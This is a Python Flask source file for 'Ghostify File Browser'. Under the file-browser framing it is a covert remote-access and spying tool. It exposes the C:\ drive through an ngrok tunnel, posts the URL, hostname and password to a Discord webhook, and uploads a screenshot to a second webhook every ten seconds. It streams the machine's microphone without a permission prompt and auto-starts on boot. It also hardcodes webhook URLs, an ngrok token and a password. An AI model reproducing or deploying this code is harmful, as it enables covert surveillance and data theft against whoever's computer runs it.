"""
Ghostify File Browser — file_browser.py
Remote visual file browser. Access from any device via ngrok tunnel.
Password protected. Posts public URL to Discord on every start.
Screenshots sent to a separate Discord webhook every 10 s.
Mic audio captured SERVER-SIDE via sounddevice — no browser permission needed.

Setup:
  1. pip install -r requirements.txt
  2. Edit the CONFIG section below
  3. python file_browser.py
  4. python install_startup.py   (to auto-start on every boot)
"""

import os
import io
import sys
import time
import struct
import threading
import datetime
import requests
from pathlib import Path
from flask import (
    Flask, render_template_string, send_file,
    abort, request, redirect, session, jsonify, Response
)

# ─── CONFIG — EDIT THESE ───────────────────────────────────────────────────────
PASSWORD               = "ghostify2024"       # Password to access the browser
ROOT_DIR               = "C:\\"              # Root folder to browse
PORT                   = 5577
DISCORD_WEBHOOK        = "https://discord.com/api/webhooks/1513883972159934526/_z_hH6qXjptSc2QAtZ08d-EmQfE-YqG3T9c--sZ6AI5uGVcFca8ol57hYjP678Ok7teI"
SCREENSHOT_WEBHOOK     = "https://discord.com/api/webhooks/1559892214077853807/uwGzc1ul3n_KxL_r0UcXTshVWgvBI2eKMEgd-lVUXqS9meWOaHw9NOIFvaF3kj7lTkGI"                   # paste your SECOND webhook URL here for screenshots
NGROK_AUTHTOKEN        = "2dGcJNRNgWGOdPNIEG8Z5S6nhPg_TB5ukkZV5qJM27izv8Dd"
SECRET_KEY             = "ghostify_secret_change_me_xk9"
SCREENSHOT_INTERVAL    = 10                   # seconds between screenshots
MIC_SAMPLE_RATE        = 44100               # Hz
MIC_CHUNK_MS           = 250                 # ms per audio chunk delivered to browser
# ───────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.secret_key = SECRET_KEY

TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>👻 Ghostify Files — {{ current_path }}</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#0d0d14;--surface:#13131f;--s2:#1a1a2e;--border:#252540;
      --accent:#7c6af7;--a2:#a78bfa;--text:#e2e2f0;--muted:#6b6b8a;--blue:#60a5fa;--red:#f87171;
      --green:#4ade80;--orange:#fb923c}
    body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh}
    a{text-decoration:none}
    ::-webkit-scrollbar{width:7px;height:7px}
    ::-webkit-scrollbar-track{background:var(--bg)}
    ::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
    .header{background:var(--surface);border-bottom:1px solid var(--border);
      padding:12px 24px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100}
    .logo{font-size:17px;font-weight:600;color:var(--a2)}
    .spacer{flex:1}
    .hbadge{font-size:11px;color:var(--muted);background:var(--s2);
      padding:4px 10px;border-radius:20px;border:1px solid var(--border)}
    .hlogout{font-size:12px;color:var(--muted);padding:5px 12px;
      border-radius:6px;border:1px solid var(--border);transition:.15s}
    .hlogout:hover{color:var(--text);border-color:var(--muted)}
    .breadcrumb{padding:10px 24px;display:flex;align-items:center;gap:5px;
      font-size:13px;background:var(--surface);border-bottom:1px solid var(--border);flex-wrap:wrap}
    .breadcrumb a{color:var(--a2);padding:3px 8px;border-radius:5px;transition:.1s}
    .breadcrumb a:hover{background:var(--s2)}
    .breadcrumb .sep{color:var(--border)}
    .breadcrumb .cur{color:var(--text);font-weight:500}
    .stats{padding:9px 24px;display:flex;gap:18px;font-size:12px;
      color:var(--muted);border-bottom:1px solid var(--border);flex-wrap:wrap}
    .stats b{color:var(--text)}
    .container{padding:16px 24px 48px}
    .fi input{background:var(--s2);border:1px solid var(--border);border-radius:8px;
      padding:8px 14px;color:var(--text);font-size:13px;width:320px;
      outline:none;font-family:inherit;transition:.15s;margin-bottom:14px}
    .fi input:focus{border-color:var(--accent)}
    table{width:100%;border-collapse:collapse}
    thead th{text-align:left;padding:9px 12px;font-size:10.5px;font-weight:600;
      color:var(--muted);letter-spacing:.8px;text-transform:uppercase;
      border-bottom:1px solid var(--border);cursor:pointer;user-select:none}
    thead th:hover{color:var(--text)}
    tbody tr{border-bottom:1px solid rgba(37,37,64,.5);transition:background .1s}
    tbody tr:hover{background:var(--s2)}
    td{padding:9px 12px;font-size:13px;vertical-align:middle}
    .tn a{color:var(--text);display:flex;align-items:center;gap:9px;font-weight:500}
    .tn a:hover{color:var(--a2)}
    .ic{font-size:17px;width:22px;text-align:center;flex-shrink:0}
    .ts{color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:11.5px}
    .td{color:var(--muted);font-size:11.5px;font-family:'JetBrains Mono',monospace;white-space:nowrap}
    .ta a{padding:3px 10px;border-radius:5px;font-size:11px;font-weight:600;
      background:var(--s2);color:var(--a2);border:1px solid var(--border);transition:.15s}
    .ta a:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
    .dn a{color:var(--blue)}
    .dn a:hover{color:var(--a2)}
    .badge{display:inline-block;padding:1px 7px;border-radius:20px;font-size:9.5px;
      font-weight:600;background:var(--s2);color:var(--muted);margin-left:5px;vertical-align:middle}
    .empty{text-align:center;padding:60px 20px;color:var(--muted)}
    .empty .ei{font-size:42px;margin-bottom:10px}
    .lpage{min-height:100vh;display:flex;align-items:center;justify-content:center;
      background:radial-gradient(ellipse at 50% 0%,#1a1a3e 0%,var(--bg) 70%)}
    .lcard{background:var(--surface);border:1px solid var(--border);border-radius:18px;
      padding:44px 40px;width:340px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
    .lcard .g{font-size:52px;margin-bottom:10px}
    .lcard h1{font-size:22px;font-weight:600;color:var(--a2);margin-bottom:6px}
    .lcard p{color:var(--muted);font-size:13px;margin-bottom:26px}
    .lcard input{width:100%;background:var(--bg);border:1px solid var(--border);
      border-radius:9px;padding:12px 14px;color:var(--text);font-size:14px;
      outline:none;font-family:inherit;margin-bottom:13px;transition:.15s}
    .lcard input:focus{border-color:var(--accent)}
    .lcard button{width:100%;background:linear-gradient(135deg,var(--accent),#9f7aea);
      color:#fff;border:none;border-radius:9px;padding:12px;font-size:14px;
      font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .2s}
    .lcard button:hover{opacity:.88}
    .err{color:var(--red);font-size:12px;margin-bottom:10px}

    /* ── Spy Toolbar ─────────────────────────────────────────────── */
    .spy-bar{background:var(--surface);border-bottom:1px solid var(--border);
      padding:10px 24px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
    .spy-title{font-size:11px;font-weight:600;letter-spacing:.7px;color:var(--muted);text-transform:uppercase}
    .spy-btn{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;
      border-radius:7px;border:1px solid var(--border);font-size:12px;font-weight:500;
      cursor:pointer;transition:.15s;font-family:inherit;background:var(--s2);color:var(--text)}
    .spy-btn:hover{border-color:var(--accent);color:var(--a2)}
    .spy-btn.active{background:linear-gradient(135deg,rgba(124,106,247,.25),rgba(167,139,250,.15));
      border-color:var(--accent);color:var(--a2)}
    .spy-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);
      flex-shrink:0;transition:.3s;display:inline-block;vertical-align:middle}
    .spy-dot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
    .spy-dot.warn{background:var(--orange);box-shadow:0 0 6px var(--orange)}
    .spy-dot.off{background:var(--red)}

    /* ── Mic Panel ───────────────────────────────────────────────── */
    #mic-panel{display:none;background:var(--surface);border-bottom:1px solid var(--border);padding:16px 24px}
    #mic-panel.open{display:block}
    .mic-head{display:flex;align-items:center;gap:10px;margin-bottom:12px}
    .mic-head h3{font-size:13px;font-weight:600;color:var(--a2)}
    .mic-status{font-size:11px;margin-left:auto}
    #mic-canvas{width:100%;height:64px;border-radius:8px;background:var(--bg);
      border:1px solid var(--border);display:block}
    .mic-controls{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;align-items:center}
    .vol-label{font-size:11px;color:var(--muted)}
    #vol-bar{width:160px;accent-color:var(--accent)}
    .mic-note{font-size:10.5px;color:var(--muted);margin-top:8px;line-height:1.5}
  </style>
</head>
<body>
{% if not logged_in %}
<div class="lpage"><div class="lcard">
  <div class="g">👻</div>
  <h1>Ghostify Files</h1>
  <p>Enter password to browse</p>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" autofocus autocomplete="off">
    <button type="submit">Unlock →</button>
  </form>
</div></div>
{% else %}
<div class="header">
  <div class="logo">👻 Ghostify Files</div>
  <div class="spacer"></div>
  <div class="hbadge">💻 {{ hostname }}</div>
  <a class="hlogout" href="/logout">Logout</a>
</div>

<!-- Spy toolbar -->
<div class="spy-bar">
  <span class="spy-title">🔍 Spy Tools</span>
  <button class="spy-btn" id="mic-toggle-btn" onclick="toggleMic()">
    <span class="spy-dot" id="mic-dot"></span>&nbsp;🎙️ Listen to Mic
  </button>
  <span style="font-size:11px;color:var(--muted);margin-left:auto">
    📸 Screenshots → Discord every {{ screenshot_interval }}s &nbsp;
    <span class="spy-dot" id="ss-dot" title="Screenshot thread status"></span>
  </span>
</div>

<!-- Mic panel -->
<div id="mic-panel">
  <div class="mic-head">
    <h3>🎙️ Live Mic Audio &nbsp;<span style="font-size:10px;color:var(--muted);font-weight:400">(server-side capture)</span></h3>
    <span class="mic-status" id="mic-status-text" style="color:var(--muted)">Idle</span>
  </div>
  <canvas id="mic-canvas"></canvas>
  <div class="mic-controls">
    <span class="vol-label">Volume:</span>
    <input type="range" id="vol-bar" min="0" max="3" step="0.05" value="1" oninput="setVolume(this.value)">
    <button class="spy-btn" id="mic-mute-btn" onclick="toggleMute()" style="padding:4px 12px;font-size:11px">🔇 Mute</button>
    <span class="vol-label" id="vol-readout">1.00x</span>
    <span class="vol-label" style="margin-left:auto" id="mic-latency"></span>
  </div>
  <p class="mic-note">
    🔒 Audio is captured directly on the server machine via Python — <b>no browser permission prompt</b>.
    Chunks are fetched every {{ chunk_ms }}ms and scheduled for gapless playback using Web Audio API.
  </p>
</div>

<div class="breadcrumb">
  {% for c in breadcrumbs %}
    {% if not loop.last %}<a href="{{ c.url }}">{{ c.name }}</a><span class="sep">/</span>
    {% else %}<span class="cur">{{ c.name }}</span>{% endif %}
  {% endfor %}
</div>
<div class="stats">
  <div>📁 <b>{{ dir_count }}</b> folders</div>
  <div>📄 <b>{{ file_count }}</b> files</div>
  <div>💾 <b>{{ total_size }}</b></div>
</div>
<div class="container">
  <div class="fi"><input type="text" placeholder="🔍 Filter..." oninput="filterRows(this.value)" autocomplete="off"></div>
  {% if entries %}
  <table id="ft">
    <thead><tr>
      <th onclick="sc(0)">Name ↕</th>
      <th onclick="sc(1)">Size ↕</th>
      <th onclick="sc(2)">Modified ↕</th>
      <th>Download</th>
    </tr></thead>
    <tbody>
      {% if parent_url is not none %}
      <tr><td class="tn dn" colspan="3"><a href="{{ parent_url }}"><span class="ic">⬆️</span>.. parent</a></td><td></td></tr>
      {% endif %}
      {% for e in entries %}
      <tr data-nm="{{ e.name|lower }}">
        <td class="tn {% if e.is_dir %}dn{% endif %}">
          <a href="{{ e.url }}"><span class="ic">{{ e.icon }}</span>{{ e.name }}{% if e.is_dir %}<span class="badge">DIR</span>{% endif %}</a>
        </td>
        <td class="ts">{{ e.size }}</td>
        <td class="td">{{ e.modified }}</td>
        <td class="ta">{% if not e.is_dir %}<a href="{{ e.dl }}">⬇ Get</a>{% endif %}</td>
      </tr>
      {% endfor %}
    </tbody>
  </table>
  {% else %}
  <div class="empty"><div class="ei">📭</div><p>Empty or inaccessible</p></div>
  {% endif %}
</div>

<script>
/* ── File table helpers ───────────────────────────────── */
function filterRows(q){q=q.toLowerCase();document.querySelectorAll('#ft tbody tr[data-nm]').forEach(r=>r.style.display=r.dataset.nm.includes(q)?'':'none');}
const sd={};
function sc(c){const tb=document.querySelector('#ft tbody');const rows=[...tb.querySelectorAll('tr[data-nm]')];sd[c]=!sd[c];rows.sort((a,b)=>{const av=(a.cells[c]?.textContent||'').trim(),bv=(b.cells[c]?.textContent||'').trim();return sd[c]?av.localeCompare(bv):bv.localeCompare(av);});rows.forEach(r=>tb.appendChild(r));}

/* ── Screenshot-dot heartbeat ─────────────────────────── */
(function(){
  const dot=document.getElementById('ss-dot');
  function ping(){
    fetch('/spy/screenshot-status').then(r=>r.json()).then(d=>{
      dot.className='spy-dot '+(d.active?'on':'warn');
      dot.title=d.active?'Screenshot thread running':'Screenshot thread not active (check SCREENSHOT_WEBHOOK)';
    }).catch(()=>{dot.className='spy-dot warn';});
  }
  ping(); setInterval(ping,5000);
})();

/* ── Mic audio — server-side stream, no permission prompt ─ */
const CHUNK_MS = {{ chunk_ms }};
let micOpen=false, audioCtx=null, gainNode=null, muted=false;
let scheduleAhead=0, nextPlayTime=0, fetchTimer=null, animFrame=null;
let lastChunkSamples=null; // for waveform

function toggleMic(){
  micOpen=!micOpen;
  document.getElementById('mic-panel').classList.toggle('open',micOpen);
  document.getElementById('mic-toggle-btn').classList.toggle('active',micOpen);
  if(micOpen) startMicStream(); else stopMicStream();
}

function setVolume(v){
  if(gainNode) gainNode.gain.value=parseFloat(v);
  document.getElementById('vol-readout').textContent=parseFloat(v).toFixed(2)+'x';
}

function toggleMute(){
  muted=!muted;
  if(gainNode) gainNode.gain.value=muted?0:parseFloat(document.getElementById('vol-bar').value);
  document.getElementById('mic-mute-btn').textContent=muted?'🔊 Unmute':'🔇 Mute';
}

function setMicStatus(text,color){
  const el=document.getElementById('mic-status-text');
  el.textContent=text; el.style.color=color||'var(--muted)';
}

async function startMicStream(){
  // First check if server mic is available
  const st=await fetch('/spy/mic-status').then(r=>r.json()).catch(()=>({active:false}));
  if(!st.active){
    setMicStatus('❌ Server mic not available — install sounddevice','var(--red)');
    document.getElementById('mic-dot').className='spy-dot off';
    return;
  }
  audioCtx=new(window.AudioContext||window.webkitAudioContext)({sampleRate:{{ sample_rate }}});
  gainNode=audioCtx.createGain();
  gainNode.gain.value=parseFloat(document.getElementById('vol-bar').value);
  gainNode.connect(audioCtx.destination);
  nextPlayTime=audioCtx.currentTime+0.3; // 300ms initial buffer
  setMicStatus('🔴 Live','var(--green)');
  document.getElementById('mic-dot').className='spy-dot on';
  drawWaveform();
  scheduleFetch();
}

function stopMicStream(){
  clearTimeout(fetchTimer);
  if(animFrame){cancelAnimationFrame(animFrame);animFrame=null;}
  if(audioCtx){audioCtx.close();audioCtx=null;}
  gainNode=null; lastChunkSamples=null;
  setMicStatus('Idle'); 
  document.getElementById('mic-dot').className='spy-dot';
  const canvas=document.getElementById('mic-canvas');
  canvas.getContext('2d').clearRect(0,0,canvas.width,canvas.height);
  document.getElementById('mic-latency').textContent='';
}

function scheduleFetch(){
  if(!micOpen||!audioCtx) return;
  const t0=performance.now();
  fetch('/spy/mic-chunk',{cache:'no-store'})
    .then(r=>r.arrayBuffer())
    .then(async buf=>{
      if(!audioCtx) return;
      try{
        const decoded=await audioCtx.decodeAudioData(buf);
        lastChunkSamples=decoded.getChannelData(0);
        const src=audioCtx.createBufferSource();
        src.buffer=decoded;
        src.connect(gainNode);
        const now=audioCtx.currentTime;
        if(nextPlayTime<now) nextPlayTime=now+0.05;
        src.start(nextPlayTime);
        nextPlayTime+=decoded.duration;
        const latency=Math.round((nextPlayTime-now)*1000);
        document.getElementById('mic-latency').textContent='buffer: '+latency+'ms';
      }catch(e){}
      fetchTimer=setTimeout(scheduleFetch, CHUNK_MS);
    })
    .catch(()=>{ fetchTimer=setTimeout(scheduleFetch, 500); });
}

/* waveform from last decoded chunk */
function drawWaveform(){
  const canvas=document.getElementById('mic-canvas');
  const ctx=canvas.getContext('2d');
  canvas.width=canvas.offsetWidth; canvas.height=canvas.offsetHeight;
  const W=canvas.width, H=canvas.height;
  ctx.fillStyle='#0d0d14'; ctx.fillRect(0,0,W,H);
  if(lastChunkSamples&&lastChunkSamples.length){
    const data=lastChunkSamples;
    const step=Math.max(1,Math.floor(data.length/W));
    const grad=ctx.createLinearGradient(0,0,W,0);
    grad.addColorStop(0,'#7c6af7'); grad.addColorStop(0.5,'#a78bfa'); grad.addColorStop(1,'#60a5fa');
    ctx.strokeStyle=grad; ctx.lineWidth=2; ctx.beginPath();
    for(let i=0;i<W;i++){
      const s=data[Math.floor(i/W*data.length)];
      const y=H/2+(s*H/2*0.9);
      if(i===0) ctx.moveTo(i,y); else ctx.lineTo(i,y);
    }
    ctx.stroke();
    // centre line
    ctx.strokeStyle='rgba(255,255,255,0.06)'; ctx.lineWidth=1;
    ctx.beginPath(); ctx.moveTo(0,H/2); ctx.lineTo(W,H/2); ctx.stroke();
  }
  if(micOpen) animFrame=requestAnimationFrame(drawWaveform);
}
</script>
{% endif %}
</body></html>
"""

# ─── Helpers ──────────────────────────────────────────────────────────────────

def fmt_size(n):
    if not n or n < 0: return '—'
    for u in ['B','KB','MB','GB','TB']:
        if n < 1024: return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} PB"

def file_icon(name, is_dir):
    if is_dir: return "📁"
    m = {'.py':'🐍','.js':'🟨','.ts':'🔷','.html':'🌐','.css':'🎨','.json':'📋',
         '.md':'📝','.txt':'📝','.log':'📜','.csv':'📊','.xlsx':'📊','.pdf':'📕',
         '.doc':'📘','.docx':'📘','.zip':'🗜️','.rar':'🗜️','.7z':'🗜️',
         '.png':'🖼️','.jpg':'🖼️','.jpeg':'🖼️','.gif':'🖼️','.svg':'🖼️',
         '.mp4':'🎬','.mkv':'🎬','.avi':'🎬','.mp3':'🎵','.wav':'🎵','.flac':'🎵',
         '.exe':'⚙️','.msi':'⚙️','.bat':'⚙️','.ps1':'⚙️','.dll':'🔧',
         '.db':'🗄️','.sqlite':'🗄️','.sql':'🗄️','.env':'🔑','.pem':'🔑','.key':'🔑'}
    return m.get(Path(name).suffix.lower(), '📄')

def safe_stat(p):
    try:
        s = p.stat()
        return s.st_size, datetime.datetime.fromtimestamp(s.st_mtime).strftime('%Y-%m-%d %H:%M')
    except: return -1, '—'

def resolve_safe(subpath):
    root = Path(ROOT_DIR).resolve()
    tgt  = (root / subpath).resolve() if subpath else root
    return tgt if str(tgt).startswith(str(root)) else None

def crumbs(subpath):
    root_name = Path(ROOT_DIR).name or ROOT_DIR.rstrip('/\\')
    cs = [{'name': root_name, 'url': '/browse/'}]
    parts = [p for p in subpath.replace('\\','/').split('/') if p]
    acc = ''
    for p in parts:
        acc += '/' + p
        cs.append({'name': p, 'url': f'/browse{acc}'})
    return cs

def make_wav(pcm_bytes: bytes, sample_rate=44100, channels=1, bits=16) -> bytes:
    """Wrap raw PCM bytes in a minimal WAV container."""
    data_len = len(pcm_bytes)
    header = struct.pack(
        '<4sI4s4sIHHIIHH4sI',
        b'RIFF', 36 + data_len, b'WAVE',
        b'fmt ', 16,
        1,                               # PCM
        channels,
        sample_rate,
        sample_rate * channels * bits // 8,
        channels * bits // 8,
        bits,
        b'data', data_len
    )
    return header + pcm_bytes

# ─── Server-side mic capture ──────────────────────────────────────────────────

_mic_active     = False
_mic_chunks: list[bytes] = []   # list of raw int16 PCM bytes objects
_mic_lock       = threading.Lock()
_MIC_MAX_BYTES  = MIC_SAMPLE_RATE * 2 * 5  # 5 seconds max buffer

def mic_capture_loop():
    global _mic_active
    try:
        import sounddevice as sd
        import numpy as np
    except ImportError:
        print("[Ghostify] sounddevice not installed — mic unavailable. Run: pip install sounddevice")
        return

    def callback(indata, frames, time_info, status):
        # indata shape: (frames, channels), dtype float32 from sounddevice
        pcm = (indata[:, 0] * 32767).astype('int16').tobytes()
        with _mic_lock:
            _mic_chunks.append(pcm)
            # Trim buffer to avoid unbounded growth
            total = sum(len(c) for c in _mic_chunks)
            while total > _MIC_MAX_BYTES and _mic_chunks:
                total -= len(_mic_chunks.pop(0))

    _mic_active = True
    print("[Ghostify] Mic capture started (server-side, no browser permission needed).")
    try:
        with sd.InputStream(
            samplerate=MIC_SAMPLE_RATE,
            channels=1,
            dtype='float32',
            callback=callback,
            blocksize=1024,
        ):
            while True:
                time.sleep(0.1)
    except Exception as e:
        _mic_active = False
        print(f"[Ghostify] Mic capture error: {e}")

# ─── Screenshot thread ────────────────────────────────────────────────────────

_screenshot_active = False

def take_screenshot_bytes():
    try:
        import mss, mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            shot = sct.grab(monitor)
            buf = io.BytesIO()
            mss.tools.to_png(shot.rgb, shot.size, output=buf)
            return buf.getvalue()
    except ImportError:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            return buf.getvalue()
        except Exception:
            return None
    except Exception:
        return None

def screenshot_loop():
    global _screenshot_active
    webhook = SCREENSHOT_WEBHOOK.strip()
    if not webhook:
        print("[Ghostify] SCREENSHOT_WEBHOOK not set — screenshot thread idle. Fill it in CONFIG.")
        return
    _screenshot_active = True
    print(f"[Ghostify] Screenshot thread started — every {SCREENSHOT_INTERVAL}s → Discord.")
    while True:
        try:
            png = take_screenshot_bytes()
            if png:
                now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                hn  = os.environ.get('COMPUTERNAME', 'Unknown')
                fn  = f"screenshot_{now.replace(':','-').replace(' ','_')}.png"
                requests.post(
                    webhook,
                    data={"content": f"📸 **Screenshot** | `{hn}` | `{now}`"},
                    files={"file": (fn, png, "image/png")},
                    timeout=20
                )
            else:
                print("[Ghostify] Screenshot capture failed — install mss: pip install mss")
        except Exception as e:
            print(f"[Ghostify] Screenshot send failed: {e}")
        time.sleep(SCREENSHOT_INTERVAL)

# ─── Routes ──────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return redirect('/browse/' if session.get('auth') else '/login')

@app.route('/login', methods=['GET','POST'])
def login():
    err = None
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            session['auth'] = True
            return redirect('/browse/')
        err = '❌ Wrong password'
    return render_template_string(TEMPLATE, logged_in=False, error=err)

@app.route('/logout')
def logout():
    session.clear(); return redirect('/login')

@app.route('/browse/', defaults={'subpath': ''})
@app.route('/browse/<path:subpath>')
def browse(subpath):
    if not session.get('auth'): return redirect('/login')
    tgt = resolve_safe(subpath)
    if not tgt or not tgt.exists(): abort(404)
    if tgt.is_file(): return send_file(tgt, as_attachment=False)
    try: items = sorted(tgt.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower()))
    except PermissionError: items = []
    entries, tb, dc, fc = [], 0, 0, 0
    for item in items:
        sz, mod = safe_stat(item)
        is_dir  = item.is_dir()
        try: rel = str(item.relative_to(Path(ROOT_DIR).resolve())).replace('\\','/')
        except: continue
        if is_dir: dc += 1; sz_s = '—'
        else: fc += 1; sz_s = fmt_size(sz); tb += max(sz, 0)
        entries.append({'name':item.name,'is_dir':is_dir,'size':sz_s,'modified':mod,
                        'icon':file_icon(item.name,is_dir),'url':f'/browse/{rel}','dl':f'/download/{rel}'})
    parts = [p for p in subpath.replace('\\','/').split('/') if p]
    parent = '/browse/' + '/'.join(parts[:-1]) if parts else None
    try: hn = os.environ.get('COMPUTERNAME') or os.uname().nodename
    except: hn = 'Unknown'
    return render_template_string(
        TEMPLATE, logged_in=True, entries=entries,
        current_path=str(tgt), breadcrumbs=crumbs(subpath), parent_url=parent,
        dir_count=dc, file_count=fc, total_size=fmt_size(tb), hostname=hn, error=None,
        screenshot_interval=SCREENSHOT_INTERVAL,
        chunk_ms=MIC_CHUNK_MS,
        sample_rate=MIC_SAMPLE_RATE,
    )

@app.route('/download/<path:subpath>')
def download(subpath):
    if not session.get('auth'): abort(403)
    tgt = resolve_safe(subpath)
    if not tgt or not tgt.exists() or not tgt.is_file(): abort(404)
    return send_file(tgt, as_attachment=True)

# ── Spy endpoints ─────────────────────────────────────────────────────────────

@app.route('/spy/screenshot-status')
def screenshot_status():
    return jsonify({"active": _screenshot_active})

@app.route('/spy/mic-status')
def mic_status():
    return jsonify({"active": _mic_active})

@app.route('/spy/mic-chunk')
def mic_chunk():
    """Return one chunk of mic audio as a WAV file (no auth bypass — still needs session)."""
    if not session.get('auth'): abort(403)
    chunk_bytes = int(MIC_SAMPLE_RATE * (MIC_CHUNK_MS / 1000.0)) * 2  # int16 = 2 bytes/sample

    with _mic_lock:
        available = b''.join(_mic_chunks)
        if len(available) >= chunk_bytes:
            pcm = available[:chunk_bytes]
            remaining = available[chunk_bytes:]
            _mic_chunks.clear()
            if remaining:
                _mic_chunks.append(remaining)
        elif available:
            # return whatever we have (shorter chunk, browser handles it fine)
            pcm = available
            _mic_chunks.clear()
        else:
            # silence — keeps playback clock ticking without gaps
            pcm = b'\x00' * chunk_bytes

    wav = make_wav(pcm, MIC_SAMPLE_RATE, 1, 16)
    return Response(
        wav,
        mimetype='audio/wav',
        headers={
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache',
        }
    )

# ─── ngrok + Discord notify ───────────────────────────────────────────────────

def start_tunnel():
    if not NGROK_AUTHTOKEN:
        print(f"[Ghostify] Local: http://localhost:{PORT}  (set NGROK_AUTHTOKEN for remote)")
        return
    try:
        from pyngrok import ngrok, conf
        conf.get_default().auth_token = NGROK_AUTHTOKEN
        url = ngrok.connect(PORT, "http").public_url
        print(f"[Ghostify] Public URL: {url}")
        if DISCORD_WEBHOOK:
            try:
                requests.post(DISCORD_WEBHOOK, json={"content":
                    f"**[Ghostify File Browser — Online]**\n"
                    f"🌐 **URL:** {url}\n"
                    f"💻 **Host:** `{os.environ.get('COMPUTERNAME','Unknown')}`\n"
                    f"📁 **Root:** `{ROOT_DIR}`\n"
                    f"🕐 **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"🔑 **Password:** `{PASSWORD}`"
                }, timeout=10)
                print("[Ghostify] URL posted to Discord.")
            except Exception as e: print(f"[Ghostify] Discord notify failed: {e}")
    except ImportError: print("[Ghostify] Run: pip install pyngrok")
    except Exception as e: print(f"[Ghostify] ngrok error: {e}")

# ─── Entry point ──────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print("[Ghostify] Starting...")
    threading.Thread(target=start_tunnel,    daemon=True).start()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=mic_capture_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
